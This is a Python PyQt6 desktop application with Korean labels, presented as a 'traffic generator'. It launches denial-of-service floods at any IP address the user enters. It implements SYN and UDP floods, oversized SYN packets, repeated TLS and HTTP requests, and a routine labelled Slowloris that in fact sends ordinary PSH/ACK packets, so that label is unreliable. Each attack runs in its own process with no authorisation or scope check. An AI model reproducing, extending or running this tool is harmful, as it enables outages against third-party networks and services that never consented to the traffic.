from PyQt6.QtWidgets import QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit, QHBoxLayout, QCheckBox, QMessageBox
from PyQt6.QtGui import QIcon
from scapy.all import IP, TCP, UDP, send
import threading
import socket
import random
from multiprocessing import Process, Value
import subprocess

def syn_flood(target_ip, count, stop_flag):
    for _ in range(count):
        if stop_flag.value:
            break
        port = random.randint(1, 65535)
        # Adjust payload size to make total packet size 1514 bytes
        payload_size = 1514 - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
        packet = IP(dst=target_ip)/TCP(dport=port, flags='S')/("X"*payload_size)
        send(packet, inter=0.0001)


def udp_flood(target_ip, count, stop_flag):
    for _ in range(count):
        if stop_flag.value:
            break
        port = random.randint(1, 65535)
        # Adjust payload size to make total packet size 1514 bytes
        payload_size = 1514 - 20 - 8 - 14  # IP header (20 bytes) + UDP header (8 bytes) + Ethernet header (14 bytes)
        packet = IP(dst=target_ip)/UDP(dport=port)/("X"*payload_size)
        send(packet, inter=0.0001)


def http_slowloris(target_ip, count, stop_flag):
    for _ in range(count):
        if stop_flag.value:
            break
        # Adjust payload size to make total packet size 1514 bytes
        payload_size = 1514 - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
        packet = IP(dst=target_ip)/TCP(dport=80, flags='PA')/("X"*payload_size)
        send(packet, inter=0.0001)


def tcp_handshake_misuse(target_ip, count, stop_flag):
    for _ in range(count):
        if stop_flag.value:
            break
        port = random.randint(1, 65535)
        # Adjust payload size to make total packet size 1554 bytes
        payload_size = 1554 - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
        packet = IP(dst=target_ip)/TCP(dport=port, flags='S')/("X"*payload_size)
        send(packet, inter=0.0001)

def ssl_traffic(target_ip, count, stop_flag):
    import ssl
    import socket
    for _ in range(count):
        if stop_flag.value:
            break
        context = ssl.create_default_context()
        with socket.create_connection((target_ip, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
                # Adjust the size of the data being sent to make the total packet size approximately 1554 bytes
                # Note: SSL/TLS overhead is variable, so this is an approximation
                data_size = 1554 - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
                data = b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n' + b'X' * data_size + b'\r\n\r\n'
                ssock.sendall(data)


def http_request_modification(target_ip, count, stop_flag):
    import requests
    for _ in range(count):
        if stop_flag.value:
            break
        headers = {'User-Agent': 'ModifiedUserAgent'}
        try:
            requests.get(f'http://{target_ip}', headers=headers)
        except requests.exceptions.RequestException:
            pass


class TrafficGeneratorApp(QWidget):
    def __init__(self, main_app, parent=None):
        super().__init__(parent)
        self.main_app = main_app  # MainApp 인스턴스를 저장
        self.setWindowTitle("트래픽 생성기")
        layout = QVBoxLayout()

        # 뒤로가기 버튼
        back_button = QPushButton("")
        back_button.setIcon(QIcon.fromTheme("go-previous"))  # 아이콘 설정
        back_button.setFixedSize(30, 30)  # 다른 어플리케이션과 동일한 크기
        back_button.clicked.connect(self.go_back)  # 뒤로가기 기능 연결
        layout.addWidget(back_button)

        # IP 입력
        ip_layout = QHBoxLayout()
        ip_label = QLabel("대상 IP:")
        self.ip_input = QLineEdit()
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.ip_input)
        layout.addLayout(ip_layout)

        # 트래픽 유형 선택
        self.syn_flood_checkbox = QCheckBox("SYN 플러드")
        self.udp_flood_checkbox = QCheckBox("UDP 플러드")
        self.http_slowloris_checkbox = QCheckBox("HTTP Slowloris")
        self.tcp_handshake_misuse_checkbox = QCheckBox("TCP 핸드셰이크 오용")
        self.ssl_traffic_checkbox = QCheckBox("SSL/TLS 트래픽")
        self.http_request_modification_checkbox = QCheckBox("HTTP 요청 변조")
        layout.addWidget(self.syn_flood_checkbox)
        layout.addWidget(self.udp_flood_checkbox)
        layout.addWidget(self.http_slowloris_checkbox)
        layout.addWidget(self.tcp_handshake_misuse_checkbox)
        layout.addWidget(self.ssl_traffic_checkbox)
        layout.addWidget(self.http_request_modification_checkbox)

        # 패킷 수 및 속도 입력
        packet_count_layout = QHBoxLayout()
        packet_count_label = QLabel("패킷 수:")
        self.packet_count_input = QLineEdit("10")
        packet_count_layout.addWidget(packet_count_label)
        packet_count_layout.addWidget(self.packet_count_input)
        layout.addLayout(packet_count_layout)

        # 패킷 생성 버튼
        generate_button = QPushButton("패킷 생성 및 전송")
        generate_button.clicked.connect(self.generate_traffic)
        layout.addWidget(generate_button)

        # 전송 중단 버튼
        stop_button = QPushButton("전송 중단")
        stop_button.clicked.connect(self.stop_transmission)
        layout.addWidget(stop_button)

        self.setLayout(layout)

        # 스레드 및 프로세스 추적을 위한 리스트
        self.processes = []
        self.stop_flag = Value('b', False)

    def go_back(self):
        # MainApp의 show_main_screen 메서드를 호출
        self.main_app.show_main_screen()

    def generate_traffic(self):
        self.stop_flag.value = False  # 중단 플래그 초기화
        target_ip = self.ip_input.text().strip()
        packet_count = int(self.packet_count_input.text())
        if self.is_valid_ip(target_ip):
            # 트래픽 생성 시작 알림
            QMessageBox.information(self, "트래픽 생성", "트래픽 생성이 시작됩니다.")

            # 명령 프롬프트 창 열기
            self.cmd_process = subprocess.Popen("start cmd /k echo 트래픽 생성 중...", shell=True)

            attack_methods = []
            if self.syn_flood_checkbox.isChecked():
                attack_methods.append(syn_flood)
            if self.udp_flood_checkbox.isChecked():
                attack_methods.append(udp_flood)
            if self.http_slowloris_checkbox.isChecked():
                attack_methods.append(http_slowloris)
            if self.tcp_handshake_misuse_checkbox.isChecked():
                attack_methods.append(tcp_handshake_misuse)
            if self.ssl_traffic_checkbox.isChecked():
                attack_methods.append(ssl_traffic)
            if self.http_request_modification_checkbox.isChecked():
                attack_methods.append(http_request_modification)

            # 각 공격 기법을 별도의 프로세스로 실행
            for method in attack_methods:
                process = Process(target=method, args=(target_ip, packet_count, self.stop_flag))
                process.start()
                self.processes.append(process)
            print(f"패킷이 {target_ip}로 전송되었습니다.")
        else:
            QMessageBox.warning(self, "잘못된 IP", "올바른 IP 주소를 입력하세요.")
            self.ip_input.clear()

    def is_valid_ip(self, ip):
        # IP 주소 유효성 검사 강화
        try:
            socket.inet_pton(socket.AF_INET, ip)
            return True
        except socket.error:
            return False

    def slowloris_attack(self, target_ip):
        # HTTP Slowloris 공격 구현
        pass

    def stop_transmission(self):
        self.stop_flag.value = True  # 중단 플래그 설정
        for process in self.processes:
            process.terminate()  # 프로세스 종료
        self.processes.clear()
        print("전송이 중단되었습니다.")
        if hasattr(self, 'cmd_process'):
            self.cmd_process.terminate()  # 명령 프롬프트 창 닫기
        # 트래픽 생성 중단 알림
        QMessageBox.information(self, "트래픽 중단", "트래픽 생성이 중단되었습니다.") 